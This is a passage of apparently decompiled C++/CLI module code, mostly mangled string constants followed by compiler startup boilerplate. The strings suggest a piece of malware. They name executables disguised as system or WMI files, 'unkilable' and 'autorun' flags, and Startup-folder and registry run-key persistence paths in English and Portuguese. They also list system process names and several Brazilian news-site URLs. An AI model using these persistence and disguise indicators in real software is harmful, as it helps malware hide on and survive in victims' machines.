  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0L\u0040HMHJEAKK\u0040wmimic\u003F4exe\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CB_W \u003F\u003F_C\u0040_1BM\u0040IENAKNKP\u0040\u003F\u0024AAw\u003F\u0024AAm\u003F\u0024AAi\u003F\u0024AAs\u003F\u0024AAe\u003F\u0024AAc\u003F\u0024AAu\u003F\u0024AAr\u003F\u0024AAe\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAe\u003F\u0024AA\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0O\u0040JPDNMFOC\u0040wmisecure\u003F4exe\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003F\u003F_C\u0040_07NLGPFEPB\u0040autorun\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BA\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0BA\u0040OBJOKNPG\u0040wmisecure64\u003F4exe\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CF\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0CF\u0040CMFNPAMF\u0040\u003F26s5d4f65ds4g65d47gfd684gfd_0022\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0O\u0040JKEHPDIC\u0040wmiintegrator\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0L\u0040CCDMCBJN\u0040wmihostwin\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003F\u003F_C\u0040_06BMIHBJFI\u0040winlsv\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003F\u003F_C\u0040_09CCFNPOLL\u0040wmisecure\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0M\u0040MGPIOAOA\u0040wmisecure64\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003F\u003F_C\u0040_06KLIOCAIJ\u0040wmimic\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CB_W \u003F\u003F_C\u0040_1O\u0040LJOFMPMD\u0040\u003F\u0024AAC\u003F\u0024AA\u003F3\u003F\u0024AA\u003F2\u003F\u0024AAt\u003F\u0024AAm\u003F\u0024AAp\u003F\u0024AA\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0FG\u0040\u0024\u0024CB_W \u003F\u003F_C\u0040_1KM\u0040PNEBDIFD\u0040\u003F\u0024AAh\u003F\u0024AAt\u003F\u0024AAt\u003F\u0024AAp\u003F\u0024AAs\u003F\u0024AA\u003F3\u003F\u0024AA\u003F1\u003F\u0024AA\u003F1\u003F\u0024AAw\u003F\u0024AAw\u003F\u0024AAw\u003F\u0024AA\u003F4\u003F\u0024AAg\u003F\u0024AAo\u003F\u0024AAo\u003F\u0024AAg\u003F\u0024AAl\u003F\u0024AAe\u003F\u0024AA\u003F4\u003F\u0024AAc\u003F\u0024AAo\u003F\u0024AAm\u003F\u0024AA\u003F4\u003F\u0024AAb\u003F\u0024AAr\u003F\u0024AA\u003F1\u003F\u0024AAi\u003F\u0024AAm\u003F\u0024AAa\u003F\u0024AAg\u003F\u0024AAe\u003F\u0024AAs\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DN\u0040\u0024\u0024CB_W \u003F\u003F_C\u0040_1HK\u0040LDJIEPBJ\u0040\u003F\u0024AAh\u003F\u0024AAt\u003F\u0024AAt\u003F\u0024AAp\u003F\u0024AA\u003F3\u003F\u0024AA\u003F1\u003F\u0024AA\u003F1\u003F\u0024AAf\u003F\u0024AA\u003F4\u003F\u0024AAi\u003F\u0024AA\u003F4\u003F\u0024AAu\u003F\u0024AAo\u003F\u0024AAl\u003F\u0024AA\u003F4\u003F\u0024AAc\u003F\u0024AAo\u003F\u0024AAm\u003F\u0024AA\u003F4\u003F\u0024AAb\u003F\u0024AAr\u003F\u0024AA\u003F1\u003F\u0024AAf\u003F\u0024AAo\u003F\u0024AAl\u003F\u0024AAh\u003F\u0024AAa\u003F\u0024AA\u003F1\u003F\u0024AAf\u003F\u0024AAu\u003F\u0024AAr\u003F\u0024AAn\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DJ\u0040\u0024\u0024CB_W \u003F\u003F_C\u0040_1HC\u0040LFGGALLO\u0040\u003F\u0024AAh\u003F\u0024AAt\u003F\u0024AAt\u003F\u0024AAp\u003F\u0024AA\u003F3\u003F\u0024AA\u003F1\u003F\u0024AA\u003F1\u003F\u0024AAc\u003F\u0024AAd\u003F\u0024AAn\u003F\u0024AA\u003F9\u003F\u0024AAc\u003F\u0024AAa\u003F\u0024AAt\u003F\u0024AAv\u003F\u0024AAe\u003F\u0024AA\u003F4\u003F\u0024AAt\u003F\u0024AAr\u003F\u0024AAr\u003F\u0024AAs\u003F\u0024AAf\u003F\u0024AA\u003F4\u003F\u0024AAc\u003F\u0024AAo\u003F\u0024AAm\u003F\u0024AA\u003F1\u003F\u0024AAn\u003F\u0024AAo\u003F\u0024AAv\u003F\u0024AAo\u003F\u0024AA\u003F1\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0EB\u0040\u0024\u0024CB_W \u003F\u003F_C\u0040_1IC\u0040BDIMMPIB\u0040\u003F\u0024AAh\u003F\u0024AAt\u003F\u0024AAt\u003F\u0024AAp\u003F\u0024AA\u003F3\u003F\u0024AA\u003F1\u003F\u0024AA\u003F1\u003F\u0024AAs\u003F\u0024AAt\u003F\u0024AAa\u003F\u0024AAt\u003F\u0024AAi\u003F\u0024AAc\u003F\u0024AAs\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAs\u003F\u0024AAt\u003F\u0024AAa\u003F\u0024AAd\u003F\u0024AAa\u003F\u0024AAo\u003F\u0024AA\u003F4\u003F\u0024AAc\u003F\u0024AAo\u003F\u0024AAm\u003F\u0024AA\u003F4\u003F\u0024AAb\u003F\u0024AAr\u003F\u0024AA\u003F1\u003F\u0024AAs\u003F\u0024AA2\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003F\u003F_C\u0040_01LFCBOECM\u0040\u003F4\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BG\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0BG\u0040NGOGJOPH\u0040\u003F2system32\u003F2notepad\u003F4exe\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003F\u003F_C\u0040_06KIMFAMMH\u0040WINDIR\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BE\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0BE\u0040FELPKEBH\u0040\u003F2Microsoft\u003F2Windows\u003F2\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0M\u0040PIILBIFA\u0040\u003F2NTUSER\u003F4DAT\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0M\u0040DPNKMMOG\u0040USERPROFILE\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CB_W \u003F\u003F_C\u0040_1BE\u0040OMGDNGEO\u0040\u003F\u0024AAc\u003F\u0024AAs\u003F\u0024AAr\u003F\u0024AAs\u003F\u0024AAs\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAe\u003F\u0024AA\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CB_W \u003F\u003F_C\u0040_1BI\u0040GOFOEOMC\u0040\u003F\u0024AAs\u003F\u0024AAv\u003F\u0024AAc\u003F\u0024AAh\u003F\u0024AAo\u003F\u0024AAs\u003F\u0024AAt\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAe\u003F\u0024AA\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CB_W \u003F\u003F_C\u0040_1BK\u0040BPIGMGKF\u0040\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAp\u003F\u0024AAl\u003F\u0024AAo\u003F\u0024AAr\u003F\u0024AAe\u003F\u0024AAr\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAe\u003F\u0024AA\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CB_W \u003F\u003F_C\u0040_1BK\u0040ILFKGFOJ\u0040\u003F\u0024AAs\u003F\u0024AAe\u003F\u0024AAr\u003F\u0024AAv\u003F\u0024AAi\u003F\u0024AAc\u003F\u0024AAe\u003F\u0024AAs\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAe\u003F\u0024AA\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CB_W \u003F\u003F_C\u0040_1O\u0040GINMMDNN\u0040\u003F\u0024AAS\u003F\u0024AAy\u003F\u0024AAs\u003F\u0024AAt\u003F\u0024AAe\u003F\u0024AAm\u003F\u0024AA\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CP\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0CP\u0040LIECOMAC\u0040\u003F2Microsoft\u003F2Windows\u003F2Start\u003F5Menu\u003F2Pr\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DG\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0DG\u0040CIHAFKCE\u0040\u003F2Microsoft\u003F2Windows\u003F2Menu\u003F5Iniciar\u003F2\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CE\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0CE\u0040HKMOADCA\u0040\u003F2Menu\u003F5Iniciar\u003F2Programas\u003F2Iniciali\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BN\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0BN\u0040KJPOONAI\u0040\u003F2Start\u003F5Menu\u003F2Programs\u003F2Startup\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BP\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0BP\u0040NNJAMPBP\u0040\u003F26s5d41g65s4g65d6tr465465t\u003F4sys\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY08\u0024\u0024CBD \u003F\u003F_C\u0040_08IHEBGAKP\u0040winstart\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0N\u0040GNFMHHBF\u0040Windows\u003F5log\u003F4\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BN\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0BN\u0040NNGJPJFG\u0040654df6sdr4f654e89r7__autorun\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0GG\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0GG\u0040NJADGLON\u0040add\u003F5\u003F\u0024CCHKEY_CURRENT_USER\u003F2Software\u003F2\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CL\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0CL\u0040OHCELFLK\u0040\u003F2Windows\u003F5Objects\u003F2wmimic\u003F4exe\u003F2\u003F\u0024CC\u003F5wi\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003F\u003F_C\u0040_04DADDNBKH\u0040\u003F5\u003F\u0024CC\u003F2\u003F\u0024CC\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003F\u003F_C\u0040_07IILGNKIF\u0040reg\u003F4exe\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003F\u003F_C\u0040_04PMOCAHAA\u0040open\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CB_W \u003F\u003F_C\u0040_1BO\u0040MIPNHMBN\u0040\u003F\u0024AAn\u003F\u0024AAo\u003F\u0024AAc\u003F\u0024AAr\u003F\u0024AAe\u003F\u0024AAa\u003F\u0024AAt\u003F\u0024AAe\u003F\u0024AAf\u003F\u0024AAo\u003F\u0024AAl\u003F\u0024AAd\u003F\u0024AAe\u003F\u0024AAr\u003F\u0024AA\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003F\u003F_C\u0040_09BIBHDFEK\u0040unkilable\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BI\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0BI\u0040MCELDNJC\u004032123vc1ngk45hjp132s2fd\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BM\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0BM\u0040NMJKDPPO\u0040invalid\u003F5vector\u003F\u0024DMT\u003F\u0024DO\u003F5subscript\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BD\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0BD\u0040OLBABOEK\u0040vector\u003F\u0024DMT\u003F\u0024DO\u003F5too\u003F5long\u003F\u0024AA\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BC\u0040\u0024\u0024CBD \u003F\u003F_C\u0040_0BC\u0040KBDMBKEH\u0040deque\u003F\u0024DMT\u003F\u0024DO\u003F5too\u003F5long\u003F\u0024AA\u0040;
  internal static int countThreadFile;
  internal static _s__ThrowInfo _TI3\u003FAVout_of_range\u0040std\u0040\u0040;
  internal static _s__RTTICompleteObjectLocator \u003F\u003F_R4RuntimeException\u0040JARVIS\u0040\u00406B\u0040;
  internal static \u0024_TypeDescriptor\u0024_extraBytes_20 \u003F\u003F_R0PAVexception\u0040std\u0040\u0040\u00408;
  internal static _s__ThrowInfo _TI3\u003FAVlength_error\u0040std\u0040\u0040;
  internal static \u0024_s__CatchableTypeArray\u0024_extraBytes_12 _CTA3PAVRuntimeException\u0040JARVIS\u0040\u0040;
  internal static \u0024_s__RTTIBaseClassArray\u0024_extraBytes_12 \u003F\u003F_R2length_error\u0040std\u0040\u00408;
  internal static \u0024_TypeDescriptor\u0024_extraBytes_30 \u003F\u003F_R0\u003FAVRuntimeException\u0040JARVIS\u0040\u0040\u00408;
  internal static _s__CatchableType _CT\u003F\u003F_R0PAVexception\u0040std\u0040\u0040\u004084;
  internal static _s__CatchableType _CT\u003F\u003F_R0\u003FAVlength_error\u0040std\u0040\u0040\u00408\u003F\u003F0length_error\u0040std\u0040\u0040\u0024\u0024FQAE\u0040ABV01\u0040\u0040Z40;
  internal static _s__CatchableType _CT\u003F\u003F_R0\u003FAVlogic_error\u0040std\u0040\u0040\u00408\u003F\u003F0logic_error\u0040std\u0040\u0040\u0024\u0024FQAE\u0040ABV01\u0040\u0040Z40;
  internal static _s__CatchableType _CT\u003F\u003F_R0\u003FAVout_of_range\u0040std\u0040\u0040\u00408\u003F\u003F0out_of_range\u0040std\u0040\u0040\u0024\u0024FQAE\u0040ABV01\u0040\u0040Z40;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02Q6AXXZ \u003F\u003F_7RuntimeException\u0040JARVIS\u0040\u00406B\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01Q6AXXZ \u003F\u003F_7_com_error\u0040\u00406B\u0040;
  internal static _s__RTTICompleteObjectLocator \u003F\u003F_R4length_error\u0040std\u0040\u00406B\u0040;
  internal static _s__RTTIBaseClassDescriptor2 \u003F\u003F_R1A\u0040\u003F0A\u0040EA\u0040RuntimeException\u0040JARVIS\u0040\u00408;
  internal static \u0024_TypeDescriptor\u0024_extraBytes_17 \u003F\u003F_R0\u003FAV_com_error\u0040\u0040\u00408;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02Q6AXXZ \u003F\u003F_7length_error\u0040std\u0040\u00406B\u0040;
  internal static _s__RTTICompleteObjectLocator \u003F\u003F_R4_com_error\u0040\u00406B\u0040;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DOI\u0040H groupBynaries;
  internal static _s__RTTIBaseClassDescriptor2 \u003F\u003F_R1A\u0040\u003F0A\u0040EA\u0040_com_error\u0040\u00408;
  internal static _s__ThrowInfo _TI3PAVRuntimeException\u0040JARVIS\u0040\u0040;
  internal static \u0024_s__CatchableTypeArray\u0024_extraBytes_12 _CTA3\u003FAVout_of_range\u0040std\u0040\u0040;
  internal static \u0024_s__RTTIBaseClassArray\u0024_extraBytes_8 \u003F\u003F_R2RuntimeException\u0040JARVIS\u0040\u00408;
  internal static _s__RTTIClassHierarchyDescriptor \u003F\u003F_R3RuntimeException\u0040JARVIS\u0040\u00408;
  internal static _s__RTTIClassHierarchyDescriptor \u003F\u003F_R3_com_error\u0040\u00408;
  internal static \u0024_TypeDescriptor\u0024_extraBytes_23 \u003F\u003F_R0\u003FAVlength_error\u0040std\u0040\u0040\u00408;
  internal static \u0024_s__CatchableTypeArray\u0024_extraBytes_8 _CTA2\u003FAVbad_alloc\u0040std\u0040\u0040;
  internal static \u0024_s__CatchableTypeArray\u0024_extraBytes_12 _CTA3\u003FAVlength_error\u0040std\u0040\u0040;
  internal static \u0024_TypeDescriptor\u0024_extraBytes_30 \u003F\u003F_R0PAVRuntimeException\u0040JARVIS\u0040\u0040\u00408;
  internal static _s__RTTIClassHierarchyDescriptor \u003F\u003F_R3length_error\u0040std\u0040\u00408;
  internal static _s__ThrowInfo _TI2\u003FAVbad_alloc\u0040std\u0040\u0040;
  internal static _s__CatchableType _CT\u003F\u003F_R0\u003FAVexception\u0040std\u0040\u0040\u00408\u003F\u003F0exception\u0040std\u0040\u0040\u0024\u0024FQAE\u0040ABV01\u0040\u0040Z12;
  internal static _s__RTTIBaseClassDescriptor2 \u003F\u003F_R1A\u0040\u003F0A\u0040EA\u0040length_error\u0040std\u0040\u00408;
  internal static \u0024_s__RTTIBaseClassArray\u0024_extraBytes_4 \u003F\u003F_R2_com_error\u0040\u00408;
  internal static _s__CatchableType _CT\u003F\u003F_R0PAVRuntimeException\u0040JARVIS\u0040\u0040\u004084;
  internal static unsafe sbyte* std\u002E\u003FA0xKWaRwtwC\u002E_bad_alloc_Message;
  internal static _s__CatchableType _CT\u003F\u003F_R0\u003FAVbad_alloc\u0040std\u0040\u0040\u00408\u003F\u003F0bad_alloc\u0040std\u0040\u0040\u0024\u0024FQAE\u0040ABV01\u0040\u0040Z12;
  internal static _s__CatchableType _CT\u003F\u003F_R0PAX\u004084;
  internal static long countCache;
  internal static \u0024_TypeDescriptor\u0024_extraBytes_5 \u003F\u003F_R0PAX\u00408;
  static unsafe int** __unep\u0040\u003Fisspace\u0040\u0040\u0024\u0024J0YAHH\u0040Z;
  public static \u0024ArrayType\u0024\u0024\u0024BY0A\u0040P6AXXZ __xc_z;
  public static volatile uint __native_vcclrit_reason;
  public static \u0024ArrayType\u0024\u0024\u0024BY0A\u0040P6AXXZ __xc_a;
  public static \u0024ArrayType\u0024\u0024\u0024BY0A\u0040P6AHXZ __xi_a;
  public static volatile __enative_startup_state __native_startup_state;
  public static \u0024ArrayType\u0024\u0024\u0024BY0A\u0040P6AHXZ __xi_z;
  public static volatile unsafe void* __native_startup_lock;
  public static volatile uint __native_dllmain_reason;
  public static \u0024ArrayType\u0024\u0024\u0024BY01Q6AXXZ \u003F\u003F_7type_info\u0040\u00406B\u0040;
  public static unsafe uint* __imp_\u003Fnpos\u0040\u003F\u0024basic_string\u0040DU\u003F\u0024char_traits\u0040D\u0040std\u0040\u0040V\u003F\u0024allocator\u0040D\u00402\u0040\u0040std\u0040\u00402IB;

  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003CCrtImplementationDetails\u003E\u002ENativeDll\u002EIsSafeForManagedCode() => (\u003CModule\u003E.__native_dllmain_reason != uint.MaxValue ? 1 : 0) == 0 || (\u003CModule\u003E.__native_vcclrit_reason != uint.MaxValue ? 1 : 0) != 0 || \u003CModule\u003E.__native_dllmain_reason != 1U && \u003CModule\u003E.__native_dllmain_reason != 0U;

  internal static unsafe int \u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002EDoNothing(
    void* cookie)
  {
    GC.KeepAlive((object) int.MaxValue);
    return 0;
  }

  [return: MarshalAs(UnmanagedType.U1)]
  internal static unsafe bool \u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002EHasPerProcess()
  {
    if (\u003CModule\u003E.\u003FhasPerProcess\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A != (TriBool.State) 2)
      return \u003CModule\u003E.\u003FhasPerProcess\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A == (TriBool.State) -1;
    void** voidPtr = (void**) &\u003CModule\u003E.\u003FA0x250abb45\u002E__xc_mp_a;
    if (ref \u003CModule\u003E.\u003FA0x250abb45\u002E__xc_mp_a < ref \u003CModule\u003E.\u003FA0x250abb45\u002E__xc_mp_z)
    {
      while (*(int*) voidPtr == 0)
      {
        voidPtr += 4;
        if ((IntPtr) voidPtr >= ref \u003CModule\u003E.\u003FA0x250abb45\u002E__xc_mp_z)
          goto label_5;
      }
      \u003CModule\u003E.\u003FhasPerProcess\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A = (TriBool.State) -1;
      return true;
    }
label_5:
    \u003CModule\u003E.\u003FhasPerProcess\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A = (TriBool.State) 0;
    return false;
  }

  [return: MarshalAs(UnmanagedType.U1)]
  internal static unsafe bool \u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002EHasNative()
  {
    if (\u003CModule\u003E.\u003FhasNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A != (TriBool.State) 2)
      return \u003CModule\u003E.\u003FhasNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A == (TriBool.State) -1;
    void** voidPtr1 = (void**) &\u003CModule\u003E.__xi_a;
    if (ref \u003CModule\u003E.__xi_a < ref \u003CModule\u003E.__xi_z)
    {
      while (*(int*) voidPtr1 == 0)
      {
        voidPtr1 += 4;
        if ((IntPtr) voidPtr1 >= ref \u003CModule\u003E.__xi_z)
          goto label_5;
      }
      \u003CModule\u003E.\u003FhasNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A = (TriBool.State) -1;
      return true;
    }
label_5:
    void** voidPtr2 = (void**) &\u003CModule\u003E.__xc_a;
    if (ref \u003CModule\u003E.__xc_a < ref \u003CModule\u003E.__xc_z)
    {
      while (*(int*) voidPtr2 == 0)
      {
        voidPtr2 += 4;
        if ((IntPtr) voidPtr2 >= ref \u003CModule\u003E.__xc_z)
          goto label_9;
      }
      \u003CModule\u003E.\u003FhasNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A = (TriBool.State) -1;
      return true;
    }
label_9:
    \u003CModule\u003E.\u003FhasNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A = (TriBool.State) 0;
    return false;
  }

  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002ENeedsInitialization() => \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002EHasPerProcess() && !\u003CModule\u003E.\u003FInitializedPerProcess\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA || \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002EHasNative() && !\u003CModule\u003E.\u003FInitializedNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA && \u003CModule\u003E.__native_startup_state == (__enative_startup_state) 0;

  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002EInitialize() => \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EDoCallBackInDefaultDomain((__FnPtr<int (void*)>) (IntPtr) \u003CModule\u003E.__unep\u0040\u003FDoNothing\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024FCGJPAX\u0040Z, (void*) 0);

  internal static void \u003FA0x250abb45\u002E\u003F\u003F__E\u003FInitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FInitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA = 0;

  internal static void \u003FA0x250abb45\u002E\u003F\u003F__E\u003FUninitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FUninitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA = 0;

  internal static void \u003FA0x250abb45\u002E\u003F\u003F__E\u003FIsDefaultDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2_NA\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FIsDefaultDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2_NA = false;

  internal static void \u003FA0x250abb45\u002E\u003F\u003F__E\u003FInitializedVtables\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FInitializedVtables\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 0;

  internal static void \u003FA0x250abb45\u002E\u003F\u003F__E\u003FInitializedNative\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FInitializedNative\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 0;

  internal static void \u003FA0x250abb45\u002E\u003F\u003F__E\u003FInitializedPerProcess\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FInitializedPerProcess\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 0;

  internal static void \u003FA0x250abb45\u002E\u003F\u003F__E\u003FInitializedPerAppDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FInitializedPerAppDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 0;

  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeVtables(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0, "The C++ module failed to load during vtable initialization.\n");
    \u003CModule\u003E.\u003FInitializedVtables\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 1;
    \u003CModule\u003E._initterm_m((__FnPtr<void* ()>*) &\u003CModule\u003E.\u003FA0x250abb45\u002E__xi_vt_a, (__FnPtr<void* ()>*) &\u003CModule\u003E.\u003FA0x250abb45\u002E__xi_vt_z);
